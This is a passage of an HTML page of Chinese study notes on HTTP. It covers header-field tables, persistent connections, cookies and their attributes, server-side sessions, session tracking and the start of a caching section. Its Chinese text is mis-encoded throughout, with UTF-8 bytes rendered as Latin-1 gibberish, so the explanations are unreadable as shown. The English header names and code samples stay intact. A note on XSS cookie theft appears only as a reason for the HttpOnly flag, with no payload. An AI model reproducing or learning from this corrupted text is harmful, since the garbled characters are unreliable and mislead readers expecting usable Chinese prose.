<td style="text-align:center">ä»£ç†æœåŠ¡å™¨çš„ç›¸å…³ä¿¡æ¯</td>
</tr>
<tr>
<td style="text-align:center">Warning</td>
<td style="text-align:center">é”™è¯¯é€šçŸ¥</td>
</tr>
</tbody>
</table>
<h2 id="è¯·æ±‚é¦–éƒ¨å­—æ®µ" tabindex="-1"> è¯·æ±‚é¦–éƒ¨å­—æ®µ</h2>
<table>
<thead>
<tr>
<th style="text-align:center">é¦–éƒ¨å­—æ®µå</th>
<th style="text-align:center">è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">Accept</td>
<td style="text-align:center">ç”¨æˆ·ä»£ç†å¯å¤„ç†çš„åª’ä½“ç±»å‹</td>
</tr>
<tr>
<td style="text-align:center">Accept-Charset</td>
<td style="text-align:center">ä¼˜å…ˆçš„å­—ç¬¦é›†</td>
</tr>
<tr>
<td style="text-align:center">Accept-Encoding</td>
<td style="text-align:center">ä¼˜å…ˆçš„å†…å®¹ç¼–ç </td>
</tr>
<tr>
<td style="text-align:center">Accept-Language</td>
<td style="text-align:center">ä¼˜å…ˆçš„è¯­è¨€ï¼ˆè‡ªç„¶è¯­è¨€ï¼‰</td>
</tr>
<tr>
<td style="text-align:center">Authorization</td>
<td style="text-align:center">Web è®¤è¯ä¿¡æ¯</td>
</tr>
<tr>
<td style="text-align:center">Expect</td>
<td style="text-align:center">æœŸå¾…æœåŠ¡å™¨çš„ç‰¹å®šè¡Œä¸º</td>
</tr>
<tr>
<td style="text-align:center">From</td>
<td style="text-align:center">ç”¨æˆ·çš„ç”µå­é‚®ç®±åœ°å€</td>
</tr>
<tr>
<td style="text-align:center">Host</td>
<td style="text-align:center">è¯·æ±‚èµ„æºæ‰€åœ¨æœåŠ¡å™¨</td>
</tr>
<tr>
<td style="text-align:center">If-Match</td>
<td style="text-align:center">æ¯”è¾ƒå®ä½“æ ‡è®°ï¼ˆETagï¼‰</td>
</tr>
<tr>
<td style="text-align:center">If-Modified-Since</td>
<td style="text-align:center">æ¯”è¾ƒèµ„æºçš„æ›´æ–°æ—¶é—´</td>
</tr>
<tr>
<td style="text-align:center">If-None-Match</td>
<td style="text-align:center">æ¯”è¾ƒå®ä½“æ ‡è®°ï¼ˆä¸ If-Match ç›¸åï¼‰</td>
</tr>
<tr>
<td style="text-align:center">If-Range</td>
<td style="text-align:center">èµ„æºæœªæ›´æ–°æ—¶å‘é€å®ä½“ Byte çš„èŒƒå›´è¯·æ±‚</td>
</tr>
<tr>
<td style="text-align:center">If-Unmodified-Since</td>
<td style="text-align:center">æ¯”è¾ƒèµ„æºçš„æ›´æ–°æ—¶é—´ï¼ˆä¸ If-Modified-Since ç›¸åï¼‰</td>
</tr>
<tr>
<td style="text-align:center">Max-Forwards</td>
<td style="text-align:center">æœ€å¤§ä¼ è¾“é€è·³æ•°</td>
</tr>
<tr>
<td style="text-align:center">Proxy-Authorization</td>
<td style="text-align:center">ä»£ç†æœåŠ¡å™¨è¦æ±‚å®¢æˆ·ç«¯çš„è®¤è¯ä¿¡æ¯</td>
</tr>
<tr>
<td style="text-align:center">Range</td>
<td style="text-align:center">å®ä½“çš„å­—èŠ‚èŒƒå›´è¯·æ±‚</td>
</tr>
<tr>
<td style="text-align:center">Referer</td>
<td style="text-align:center">å¯¹è¯·æ±‚ä¸­ URI çš„åŸå§‹è·å–æ–¹</td>
</tr>
<tr>
<td style="text-align:center">TE</td>
<td style="text-align:center">ä¼ è¾“ç¼–ç çš„ä¼˜å…ˆçº§</td>
</tr>
<tr>
<td style="text-align:center">User-Agent</td>
<td style="text-align:center">HTTP å®¢æˆ·ç«¯ç¨‹åºçš„ä¿¡æ¯</td>
</tr>
</tbody>
</table>
<h2 id="å“åº”é¦–éƒ¨å­—æ®µ" tabindex="-1"> å“åº”é¦–éƒ¨å­—æ®µ</h2>
<table>
<thead>
<tr>
<th style="text-align:center">é¦–éƒ¨å­—æ®µå</th>
<th style="text-align:center">è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">Accept-Ranges</td>
<td style="text-align:center">æ˜¯å¦æ¥å—å­—èŠ‚èŒƒå›´è¯·æ±‚</td>
</tr>
<tr>
<td style="text-align:center">Age</td>
<td style="text-align:center">æ¨ç®—èµ„æºåˆ›å»ºç»è¿‡æ—¶é—´</td>
</tr>
<tr>
<td style="text-align:center">ETag</td>
<td style="text-align:center">èµ„æºçš„åŒ¹é…ä¿¡æ¯</td>
</tr>
<tr>
<td style="text-align:center">Location</td>
<td style="text-align:center">ä»¤å®¢æˆ·ç«¯é‡å®šå‘è‡³æŒ‡å®š URI</td>
</tr>
<tr>
<td style="text-align:center">Proxy-Authenticate</td>
<td style="text-align:center">ä»£ç†æœåŠ¡å™¨å¯¹å®¢æˆ·ç«¯çš„è®¤è¯ä¿¡æ¯</td>
</tr>
<tr>
<td style="text-align:center">Retry-After</td>
<td style="text-align:center">å¯¹å†æ¬¡å‘èµ·è¯·æ±‚çš„æ—¶æœºè¦æ±‚</td>
</tr>
<tr>
<td style="text-align:center">Server</td>
<td style="text-align:center">HTTP æœåŠ¡å™¨çš„å®‰è£…ä¿¡æ¯</td>
</tr>
<tr>
<td style="text-align:center">Vary</td>
<td style="text-align:center">ä»£ç†æœåŠ¡å™¨ç¼“å­˜çš„ç®¡ç†ä¿¡æ¯</td>
</tr>
<tr>
<td style="text-align:center">WWW-Authenticate</td>
<td style="text-align:center">æœåŠ¡å™¨å¯¹å®¢æˆ·ç«¯çš„è®¤è¯ä¿¡æ¯</td>
</tr>
</tbody>
</table>
<h2 id="å®ä½“é¦–éƒ¨å­—æ®µ" tabindex="-1"> å®ä½“é¦–éƒ¨å­—æ®µ</h2>
<table>
<thead>
<tr>
<th style="text-align:center">é¦–éƒ¨å­—æ®µå</th>
<th style="text-align:center">è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">Allow</td>
<td style="text-align:center">èµ„æºå¯æ”¯æŒçš„ HTTP æ–¹æ³•</td>
</tr>
<tr>
<td style="text-align:center">Content-Encoding</td>
<td style="text-align:center">å®ä½“ä¸»ä½“é€‚ç”¨çš„ç¼–ç æ–¹å¼</td>
</tr>
<tr>
<td style="text-align:center">Content-Language</td>
<td style="text-align:center">å®ä½“ä¸»ä½“çš„è‡ªç„¶è¯­è¨€</td>
</tr>
<tr>
<td style="text-align:center">Content-Length</td>
<td style="text-align:center">å®ä½“ä¸»ä½“çš„å¤§å°</td>
</tr>
<tr>
<td style="text-align:center">Content-Location</td>
<td style="text-align:center">æ›¿ä»£å¯¹åº”èµ„æºçš„ URI</td>
</tr>
<tr>
<td style="text-align:center">Content-MD5</td>
<td style="text-align:center">å®ä½“ä¸»ä½“çš„æŠ¥æ–‡æ‘˜è¦</td>
</tr>
<tr>
<td style="text-align:center">Content-Range</td>
<td style="text-align:center">å®ä½“ä¸»ä½“çš„ä½ç½®èŒƒå›´</td>
</tr>
<tr>
<td style="text-align:center">Content-Type</td>
<td style="text-align:center">å®ä½“ä¸»ä½“çš„åª’ä½“ç±»å‹</td>
</tr>
<tr>
<td style="text-align:center">Expires</td>
<td style="text-align:center">å®ä½“ä¸»ä½“è¿‡æœŸçš„æ—¥æœŸæ—¶é—´</td>
</tr>
<tr>
<td style="text-align:center">Last-Modified</td>
<td style="text-align:center">èµ„æºçš„æœ€åä¿®æ”¹æ—¥æœŸæ—¶é—´</td>
</tr>
</tbody>
</table>
<h1 id="å››ã€å…·ä½“åº”ç”¨" tabindex="-1"> å››ã€å…·ä½“åº”ç”¨</h1>
<h2 id="è¿æ¥ç®¡ç†" tabindex="-1"> è¿æ¥ç®¡ç†</h2>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/HTTP1_x_Connections.png" width="800"/> </div><br>
<h3 id="_1-çŸ­è¿æ¥ä¸é•¿è¿æ¥" tabindex="-1"> 1. çŸ­è¿æ¥ä¸é•¿è¿æ¥</h3>
<p>å½“æµè§ˆå™¨è®¿é—®ä¸€ä¸ªåŒ…å«å¤šå¼ å›¾ç‰‡çš„ HTML é¡µé¢æ—¶ï¼Œé™¤äº†è¯·æ±‚è®¿é—®çš„ HTML é¡µé¢èµ„æºï¼Œè¿˜ä¼šè¯·æ±‚å›¾ç‰‡èµ„æºã€‚å¦‚æœæ¯è¿›è¡Œä¸€æ¬¡ HTTP é€šä¿¡å°±è¦æ–°å»ºä¸€ä¸ª TCP è¿æ¥ï¼Œé‚£ä¹ˆå¼€é”€ä¼šå¾ˆå¤§ã€‚</p>
<p>é•¿è¿æ¥åªéœ€è¦å»ºç«‹ä¸€æ¬¡ TCP è¿æ¥å°±èƒ½è¿›è¡Œå¤šæ¬¡ HTTP é€šä¿¡ã€‚</p>
<ul>
<li>ä» HTTP/1.1 å¼€å§‹é»˜è®¤æ˜¯é•¿è¿æ¥çš„ï¼Œå¦‚æœè¦æ–­å¼€è¿æ¥ï¼Œéœ€è¦ç”±å®¢æˆ·ç«¯æˆ–è€…æœåŠ¡å™¨ç«¯æå‡ºæ–­å¼€ï¼Œä½¿ç”¨ <code>Connection : close</code>ï¼›</li>
<li>åœ¨ HTTP/1.1 ä¹‹å‰é»˜è®¤æ˜¯çŸ­è¿æ¥çš„ï¼Œå¦‚æœéœ€è¦ä½¿ç”¨é•¿è¿æ¥ï¼Œåˆ™ä½¿ç”¨ <code>Connection : Keep-Alive</code>ã€‚</li>
</ul>
<h3 id="_2-æµæ°´çº¿" tabindex="-1"> 2. æµæ°´çº¿</h3>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒHTTP è¯·æ±‚æ˜¯æŒ‰é¡ºåºå‘å‡ºçš„ï¼Œä¸‹ä¸€ä¸ªè¯·æ±‚åªæœ‰åœ¨å½“å‰è¯·æ±‚æ”¶åˆ°å“åº”ä¹‹åæ‰ä¼šè¢«å‘å‡ºã€‚ç”±äºå—åˆ°ç½‘ç»œå»¶è¿Ÿå’Œå¸¦å®½çš„é™åˆ¶ï¼Œåœ¨ä¸‹ä¸€ä¸ªè¯·æ±‚è¢«å‘é€åˆ°æœåŠ¡å™¨ä¹‹å‰ï¼Œå¯èƒ½éœ€è¦ç­‰å¾…å¾ˆé•¿æ—¶é—´ã€‚</p>
<p>æµæ°´çº¿æ˜¯åœ¨åŒä¸€æ¡é•¿è¿æ¥ä¸Šè¿ç»­å‘å‡ºè¯·æ±‚ï¼Œè€Œä¸ç”¨ç­‰å¾…å“åº”è¿”å›ï¼Œè¿™æ ·å¯ä»¥å‡å°‘å»¶è¿Ÿã€‚</p>
<h2 id="cookie" tabindex="-1"> Cookie</h2>
<p>HTTP åè®®æ˜¯æ— çŠ¶æ€çš„ï¼Œä¸»è¦æ˜¯ä¸ºäº†è®© HTTP åè®®å°½å¯èƒ½ç®€å•ï¼Œä½¿å¾—å®ƒèƒ½å¤Ÿå¤„ç†å¤§é‡äº‹åŠ¡ã€‚HTTP/1.1 å¼•å…¥ Cookie æ¥ä¿å­˜çŠ¶æ€ä¿¡æ¯ã€‚</p>
<p>Cookie æ˜¯æœåŠ¡å™¨å‘é€åˆ°ç”¨æˆ·æµè§ˆå™¨å¹¶ä¿å­˜åœ¨æœ¬åœ°çš„ä¸€å°å—æ•°æ®ï¼Œå®ƒä¼šåœ¨æµè§ˆå™¨ä¹‹åå‘åŒä¸€æœåŠ¡å™¨å†æ¬¡å‘èµ·è¯·æ±‚æ—¶è¢«æºå¸¦ä¸Šï¼Œç”¨äºå‘ŠçŸ¥æœåŠ¡ç«¯ä¸¤ä¸ªè¯·æ±‚æ˜¯å¦æ¥è‡ªåŒä¸€æµè§ˆå™¨ã€‚ç”±äºä¹‹åæ¯æ¬¡è¯·æ±‚éƒ½ä¼šéœ€è¦æºå¸¦ Cookie æ•°æ®ï¼Œå› æ­¤ä¼šå¸¦æ¥é¢å¤–çš„æ€§èƒ½å¼€é”€ï¼ˆå°¤å…¶æ˜¯åœ¨ç§»åŠ¨ç¯å¢ƒä¸‹ï¼‰ã€‚</p>
<p>Cookie æ›¾ä¸€åº¦ç”¨äºå®¢æˆ·ç«¯æ•°æ®çš„å­˜å‚¨ï¼Œå› ä¸ºå½“æ—¶å¹¶æ²¡æœ‰å…¶å®ƒåˆé€‚çš„å­˜å‚¨åŠæ³•è€Œä½œä¸ºå”¯ä¸€çš„å­˜å‚¨æ‰‹æ®µï¼Œä½†ç°åœ¨éšç€ç°ä»£æµè§ˆå™¨å¼€å§‹æ”¯æŒå„ç§å„æ ·çš„å­˜å‚¨æ–¹å¼ï¼ŒCookie æ¸æ¸è¢«æ·˜æ±°ã€‚æ–°çš„æµè§ˆå™¨ API å·²ç»å…è®¸å¼€å‘è€…ç›´æ¥å°†æ•°æ®å­˜å‚¨åˆ°æœ¬åœ°ï¼Œå¦‚ä½¿ç”¨ Web storage APIï¼ˆæœ¬åœ°å­˜å‚¨å’Œä¼šè¯å­˜å‚¨ï¼‰æˆ– IndexedDBã€‚</p>
<h3 id="_1-ç”¨é€”" tabindex="-1"> 1. ç”¨é€”</h3>
<ul>
<li>ä¼šè¯çŠ¶æ€ç®¡ç†ï¼ˆå¦‚ç”¨æˆ·ç™»å½•çŠ¶æ€ã€è´­ç‰©è½¦ã€æ¸¸æˆåˆ†æ•°æˆ–å…¶å®ƒéœ€è¦è®°å½•çš„ä¿¡æ¯ï¼‰</li>
<li>ä¸ªæ€§åŒ–è®¾ç½®ï¼ˆå¦‚ç”¨æˆ·è‡ªå®šä¹‰è®¾ç½®ã€ä¸»é¢˜ç­‰ï¼‰</li>
<li>æµè§ˆå™¨è¡Œä¸ºè·Ÿè¸ªï¼ˆå¦‚è·Ÿè¸ªåˆ†æç”¨æˆ·è¡Œä¸ºç­‰ï¼‰</li>
</ul>
<h3 id="_2-åˆ›å»ºè¿‡ç¨‹" tabindex="-1"> 2. åˆ›å»ºè¿‡ç¨‹</h3>
<p>æœåŠ¡å™¨å‘é€çš„å“åº”æŠ¥æ–‡åŒ…å« Set-Cookie é¦–éƒ¨å­—æ®µï¼Œå®¢æˆ·ç«¯å¾—åˆ°å“åº”æŠ¥æ–‡åæŠŠ Cookie å†…å®¹ä¿å­˜åˆ°æµè§ˆå™¨ä¸­ã€‚</p>
<div><pre><code>HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry

[page content]
</code></pre></div><p>å®¢æˆ·ç«¯ä¹‹åå¯¹åŒä¸€ä¸ªæœåŠ¡å™¨å‘é€è¯·æ±‚æ—¶ï¼Œä¼šä»æµè§ˆå™¨ä¸­å–å‡º Cookie ä¿¡æ¯å¹¶é€šè¿‡ Cookie è¯·æ±‚é¦–éƒ¨å­—æ®µå‘é€ç»™æœåŠ¡å™¨ã€‚</p>
<div><pre><code>GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry
</code></pre></div><h3 id="_3-åˆ†ç±»" tabindex="-1"> 3. åˆ†ç±»</h3>
<ul>
<li>ä¼šè¯æœŸ Cookieï¼šæµè§ˆå™¨å…³é—­ä¹‹åå®ƒä¼šè¢«è‡ªåŠ¨åˆ é™¤ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒä»…åœ¨ä¼šè¯æœŸå†…æœ‰æ•ˆã€‚</li>
<li>æŒä¹…æ€§ Cookieï¼šæŒ‡å®šè¿‡æœŸæ—¶é—´ï¼ˆExpiresï¼‰æˆ–æœ‰æ•ˆæœŸï¼ˆmax-ageï¼‰ä¹‹åå°±æˆä¸ºäº†æŒä¹…æ€§çš„ Cookieã€‚</li>
</ul>
<div><pre><code>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
</code></pre></div><h3 id="_4-ä½œç”¨åŸŸ" tabindex="-1"> 4. ä½œç”¨åŸŸ</h3>
<p>Domain æ ‡è¯†æŒ‡å®šäº†å“ªäº›ä¸»æœºå¯ä»¥æ¥å— Cookieã€‚å¦‚æœä¸æŒ‡å®šï¼Œé»˜è®¤ä¸ºå½“å‰æ–‡æ¡£çš„ä¸»æœºï¼ˆä¸åŒ…å«å­åŸŸåï¼‰ã€‚å¦‚æœæŒ‡å®šäº† Domainï¼Œåˆ™ä¸€èˆ¬åŒ…å«å­åŸŸåã€‚ä¾‹å¦‚ï¼Œå¦‚æœè®¾ç½® Domain=mozilla.orgï¼Œåˆ™ Cookie ä¹ŸåŒ…å«åœ¨å­åŸŸåä¸­ï¼ˆå¦‚ developer.mozilla.orgï¼‰ã€‚</p>
<p>Path æ ‡è¯†æŒ‡å®šäº†ä¸»æœºä¸‹çš„å“ªäº›è·¯å¾„å¯ä»¥æ¥å— Cookieï¼ˆè¯¥ URL è·¯å¾„å¿…é¡»å­˜åœ¨äºè¯·æ±‚ URL ä¸­ï¼‰ã€‚ä»¥å­—ç¬¦ %x2F (&quot;/&quot;) ä½œä¸ºè·¯å¾„åˆ†éš”ç¬¦ï¼Œå­è·¯å¾„ä¹Ÿä¼šè¢«åŒ¹é…ã€‚ä¾‹å¦‚ï¼Œè®¾ç½® Path=/docsï¼Œåˆ™ä»¥ä¸‹åœ°å€éƒ½ä¼šåŒ¹é…ï¼š</p>
<ul>
<li>/docs</li>
<li>/docs/Web/</li>
<li>/docs/Web/HTTP</li>
</ul>
<h3 id="_5-javascript" tabindex="-1"> 5. JavaScript</h3>
<p>æµè§ˆå™¨é€šè¿‡ <code>document.cookie</code> å±æ€§å¯åˆ›å»ºæ–°çš„ Cookieï¼Œä¹Ÿå¯é€šè¿‡è¯¥å±æ€§è®¿é—®é HttpOnly æ ‡è®°çš„ Cookieã€‚</p>
<div><pre><code>document.cookie = "yummy_cookie=choco";
document.cookie = "tasty_cookie=strawberry";
console.log(document.cookie);
</code></pre></div><h3 id="_6-httponly" tabindex="-1"> 6. HttpOnly</h3>
<p>æ ‡è®°ä¸º HttpOnly çš„ Cookie ä¸èƒ½è¢« JavaScript è„šæœ¬è°ƒç”¨ã€‚è·¨ç«™è„šæœ¬æ”»å‡» (XSS) å¸¸å¸¸ä½¿ç”¨ JavaScript çš„ <code>document.cookie</code> API çªƒå–ç”¨æˆ·çš„ Cookie ä¿¡æ¯ï¼Œå› æ­¤ä½¿ç”¨ HttpOnly æ ‡è®°å¯ä»¥åœ¨ä¸€å®šç¨‹åº¦ä¸Šé¿å… XSS æ”»å‡»ã€‚</p>
<div><pre><code>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
</code></pre></div><h3 id="_7-secure" tabindex="-1"> 7. Secure</h3>
<p>æ ‡è®°ä¸º Secure çš„ Cookie åªèƒ½é€šè¿‡è¢« HTTPS åè®®åŠ å¯†è¿‡çš„è¯·æ±‚å‘é€ç»™æœåŠ¡ç«¯ã€‚ä½†å³ä¾¿è®¾ç½®äº† Secure æ ‡è®°ï¼Œæ•æ„Ÿä¿¡æ¯ä¹Ÿä¸åº”è¯¥é€šè¿‡ Cookie ä¼ è¾“ï¼Œå› ä¸º Cookie æœ‰å…¶å›ºæœ‰çš„ä¸å®‰å…¨æ€§ï¼ŒSecure æ ‡è®°ä¹Ÿæ— æ³•æä¾›ç¡®å®çš„å®‰å…¨ä¿éšœã€‚</p>
<h3 id="_8-session" tabindex="-1"> 8. Session</h3>
<p>é™¤äº†å¯ä»¥å°†ç”¨æˆ·ä¿¡æ¯é€šè¿‡ Cookie å­˜å‚¨åœ¨ç”¨æˆ·æµè§ˆå™¨ä¸­ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨ Session å­˜å‚¨åœ¨æœåŠ¡å™¨ç«¯ï¼Œå­˜å‚¨åœ¨æœåŠ¡å™¨ç«¯çš„ä¿¡æ¯æ›´åŠ å®‰å…¨ã€‚</p>
<p>Session å¯ä»¥å­˜å‚¨åœ¨æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ã€æ•°æ®åº“æˆ–è€…å†…å­˜ä¸­ã€‚ä¹Ÿå¯ä»¥å°† Session å­˜å‚¨åœ¨ Redis è¿™ç§å†…å­˜å‹æ•°æ®åº“ä¸­ï¼Œæ•ˆç‡ä¼šæ›´é«˜ã€‚</p>
<p>ä½¿ç”¨ Session ç»´æŠ¤ç”¨æˆ·ç™»å½•çŠ¶æ€çš„è¿‡ç¨‹å¦‚ä¸‹ï¼š</p>
<ul>
<li>ç”¨æˆ·è¿›è¡Œç™»å½•æ—¶ï¼Œç”¨æˆ·æäº¤åŒ…å«ç”¨æˆ·åå’Œå¯†ç çš„è¡¨å•ï¼Œæ”¾å…¥ HTTP è¯·æ±‚æŠ¥æ–‡ä¸­ï¼›</li>
<li>æœåŠ¡å™¨éªŒè¯è¯¥ç”¨æˆ·åå’Œå¯†ç ï¼Œå¦‚æœæ­£ç¡®åˆ™æŠŠç”¨æˆ·ä¿¡æ¯å­˜å‚¨åˆ° Redis ä¸­ï¼Œå®ƒåœ¨ Redis ä¸­çš„ Key ç§°ä¸º Session IDï¼›</li>
<li>æœåŠ¡å™¨è¿”å›çš„å“åº”æŠ¥æ–‡çš„ Set-Cookie é¦–éƒ¨å­—æ®µåŒ…å«äº†è¿™ä¸ª Session IDï¼Œå®¢æˆ·ç«¯æ”¶åˆ°å“åº”æŠ¥æ–‡ä¹‹åå°†è¯¥ Cookie å€¼å­˜å…¥æµè§ˆå™¨ä¸­ï¼›</li>
<li>å®¢æˆ·ç«¯ä¹‹åå¯¹åŒä¸€ä¸ªæœåŠ¡å™¨è¿›è¡Œè¯·æ±‚æ—¶ä¼šåŒ…å«è¯¥ Cookie å€¼ï¼ŒæœåŠ¡å™¨æ”¶åˆ°ä¹‹åæå–å‡º Session IDï¼Œä» Redis ä¸­å–å‡ºç”¨æˆ·ä¿¡æ¯ï¼Œç»§ç»­ä¹‹å‰çš„ä¸šåŠ¡æ“ä½œã€‚</li>
</ul>
<p>åº”è¯¥æ³¨æ„ Session ID çš„å®‰å…¨æ€§é—®é¢˜ï¼Œä¸èƒ½è®©å®ƒè¢«æ¶æ„æ”»å‡»è€…è½»æ˜“è·å–ï¼Œé‚£ä¹ˆå°±ä¸èƒ½äº§ç”Ÿä¸€ä¸ªå®¹æ˜“è¢«çŒœåˆ°çš„ Session ID å€¼ã€‚æ­¤å¤–ï¼Œè¿˜éœ€è¦ç»å¸¸é‡æ–°ç”Ÿæˆ Session IDã€‚åœ¨å¯¹å®‰å…¨æ€§è¦æ±‚æé«˜çš„åœºæ™¯ä¸‹ï¼Œä¾‹å¦‚è½¬è´¦ç­‰æ“ä½œï¼Œé™¤äº†ä½¿ç”¨ Session ç®¡ç†ç”¨æˆ·çŠ¶æ€ä¹‹å¤–ï¼Œè¿˜éœ€è¦å¯¹ç”¨æˆ·è¿›è¡Œé‡æ–°éªŒè¯ï¼Œæ¯”å¦‚é‡æ–°è¾“å…¥å¯†ç ï¼Œæˆ–è€…ä½¿ç”¨çŸ­ä¿¡éªŒè¯ç ç­‰æ–¹å¼ã€‚</p>
<h3 id="_9-æµè§ˆå™¨ç¦ç”¨-cookie" tabindex="-1"> 9. æµè§ˆå™¨ç¦ç”¨ Cookie</h3>
<p>æ­¤æ—¶æ— æ³•ä½¿ç”¨ Cookie æ¥ä¿å­˜ç”¨æˆ·ä¿¡æ¯ï¼Œåªèƒ½ä½¿ç”¨ Sessionã€‚é™¤æ­¤ä¹‹å¤–ï¼Œä¸èƒ½å†å°† Session ID å­˜æ”¾åˆ° Cookie ä¸­ï¼Œè€Œæ˜¯ä½¿ç”¨ URL é‡å†™æŠ€æœ¯ï¼Œå°† Session ID ä½œä¸º URL çš„å‚æ•°è¿›è¡Œä¼ é€’ã€‚</p>
<h3 id="_10-cookie-ä¸-session-é€‰æ‹©" tabindex="-1"> 10. Cookie ä¸ Session é€‰æ‹©</h3>
<ul>
<li>Cookie åªèƒ½å­˜å‚¨ ASCII ç å­—ç¬¦ä¸²ï¼Œè€Œ Session åˆ™å¯ä»¥å­˜å‚¨ä»»ä½•ç±»å‹çš„æ•°æ®ï¼Œå› æ­¤åœ¨è€ƒè™‘æ•°æ®å¤æ‚æ€§æ—¶é¦–é€‰ Sessionï¼›</li>
<li>Cookie å­˜å‚¨åœ¨æµè§ˆå™¨ä¸­ï¼Œå®¹æ˜“è¢«æ¶æ„æŸ¥çœ‹ã€‚å¦‚æœéè¦å°†ä¸€äº›éšç§æ•°æ®å­˜åœ¨ Cookie ä¸­ï¼Œå¯ä»¥å°† Cookie å€¼è¿›è¡ŒåŠ å¯†ï¼Œç„¶ååœ¨æœåŠ¡å™¨è¿›è¡Œè§£å¯†ï¼›</li>
<li>å¯¹äºå¤§å‹ç½‘ç«™ï¼Œå¦‚æœç”¨æˆ·æ‰€æœ‰çš„ä¿¡æ¯éƒ½å­˜å‚¨åœ¨ Session ä¸­ï¼Œé‚£ä¹ˆå¼€é”€æ˜¯éå¸¸å¤§çš„ï¼Œå› æ­¤ä¸å»ºè®®å°†æ‰€æœ‰çš„ç”¨æˆ·ä¿¡æ¯éƒ½å­˜å‚¨åˆ° Session ä¸­ã€‚</li>
</ul>
<h2 id="ä¼šè¯è·Ÿè¸ª" tabindex="-1"> ä¼šè¯è·Ÿè¸ª</h2>
<p>ä¼šè¯è·Ÿè¸ªæ˜¯ä¸€ç§çµæ´»ã€è½»ä¾¿çš„æœºåˆ¶ï¼Œå®ƒä½¿Webä¸Šçš„çŠ¶æ€ç¼–ç¨‹å˜ä¸ºå¯èƒ½ã€‚</p>
<p>HTTPæ˜¯ä¸€ç§æ— çŠ¶æ€åè®®ï¼Œæ¯å½“ç”¨æˆ·å‘å‡ºè¯·æ±‚æ—¶ï¼ŒæœåŠ¡å™¨å°±ä¼šåšå‡ºå“åº”ï¼Œå®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ä¹‹é—´çš„è”ç³»æ˜¯ç¦»æ•£çš„ã€éè¿ç»­çš„ã€‚å½“ç”¨æˆ·åœ¨åŒä¸€ç½‘ç«™çš„å¤šä¸ªé¡µé¢ä¹‹é—´è½¬æ¢æ—¶ï¼Œæ ¹æœ¬æ— æ³•ç¡®å®šæ˜¯å¦æ˜¯åŒä¸€ä¸ªå®¢æˆ·ï¼Œä¼šè¯è·Ÿè¸ªæŠ€æœ¯å°±å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚å½“ä¸€ä¸ªå®¢æˆ·åœ¨å¤šä¸ªé¡µé¢é—´åˆ‡æ¢æ—¶ï¼ŒæœåŠ¡å™¨ä¼šä¿å­˜è¯¥ç”¨æˆ·çš„ä¿¡æ¯ã€‚</p>
<p>æœ‰å››ç§æ–¹æ³•å¯ä»¥å®ç°ä¼šè¯è·Ÿè¸ªæŠ€æœ¯ï¼šURLé‡å†™ã€éšè—è¡¨å•åŸŸã€Cookieã€Sessionã€‚</p>
<ol>
<li>éšè—è¡¨å•åŸŸï¼š<input type="hidden">ï¼Œéå¸¸é€‚åˆæ­¥éœ€è¦å¤§é‡æ•°æ®å­˜å‚¨çš„ä¼šè¯åº”ç”¨ã€‚</li>
<li>URL é‡å†™:URL å¯ä»¥åœ¨åé¢é™„åŠ å‚æ•°ï¼Œå’ŒæœåŠ¡å™¨çš„è¯·æ±‚ä¸€èµ·å‘é€ï¼Œè¿™äº›å‚æ•°ä¸ºåå­—/å€¼å¯¹ã€‚</li>
<li>Cookie:ä¸€ä¸ª Cookie æ˜¯ä¸€ä¸ªå°çš„ï¼Œå·²å‘½åæ•°æ®å…ƒç´ ã€‚æœåŠ¡å™¨ä½¿ç”¨ SET-Cookie å¤´æ ‡å°†å®ƒä½œä¸º HTTPå“åº”çš„ä¸€éƒ¨åˆ†ä¼ é€åˆ°å®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯è¢«è¯·æ±‚ä¿å­˜ Cookie å€¼ï¼Œåœ¨å¯¹åŒä¸€æœåŠ¡å™¨çš„åç»­è¯·æ±‚ä½¿ç”¨ä¸€ä¸ªCookie å¤´æ ‡å°†ä¹‹è¿”å›åˆ°æœåŠ¡å™¨ã€‚ä¸å…¶å®ƒæŠ€æœ¯æ¯”è¾ƒï¼ŒCookie çš„ä¸€ä¸ªä¼˜ç‚¹æ˜¯åœ¨æµè§ˆå™¨ä¼šè¯ç»“æŸåï¼Œç”šè‡³åœ¨å®¢æˆ·ç«¯è®¡ç®—æœºé‡å¯åå®ƒä»å¯ä»¥ä¿ç•™å…¶å€¼</li>
<li>Sessionï¼šä½¿ç”¨ setAttribute(String str,Object obj)æ–¹æ³•å°†å¯¹è±¡æ†ç»‘åˆ°ä¸€ä¸ªä¼šè¯</li>
</ol>
<h2 id="ç¼“å­˜" tabindex="-1"> ç¼“å­˜</h2>
<h3 id="_1-ä¼˜ç‚¹" tabindex="-1"> 1. ä¼˜ç‚¹</h3>
<ul>
<li>ç¼“è§£æœåŠ¡å™¨å‹åŠ›ï¼›</li>
<li>é™ä½å®¢æˆ·ç«¯è·å–èµ„æºçš„å»¶è¿Ÿï¼šç¼“å­˜é€šå¸¸ä½äºå†…å­˜ä¸­ï¼Œè¯»å–ç¼“å­˜çš„é€Ÿåº¦æ›´å¿«ã€‚å¹¶ä¸”ç¼“å­˜æœåŠ¡å™¨åœ¨åœ°ç†ä½ç½®ä¸Šä¹Ÿæœ‰å¯èƒ½æ¯”æºæœåŠ¡å™¨æ¥å¾—è¿‘ï¼Œä¾‹å¦‚æµè§ˆå™¨ç¼“å­˜ã€‚</li>
</ul>
<h3 id="_2-å®ç°æ–¹æ³•" tabindex="-1"> 2. å®ç°æ–¹æ³•</h3>
<ul>
<li>è®©ä»£ç†æœåŠ¡å™¨è¿›è¡Œç¼“å­˜ï¼›</li>
